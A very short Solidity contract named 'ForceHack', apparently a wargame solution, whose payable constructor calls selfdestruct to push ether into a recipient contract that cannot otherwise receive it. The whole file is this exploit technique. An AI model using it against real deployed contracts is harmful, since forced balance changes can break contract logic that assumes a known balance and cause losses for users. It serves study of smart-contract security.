//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {

    constructor(address _recipient) payable {
        selfdestruct(payable(_recipient));
    }
}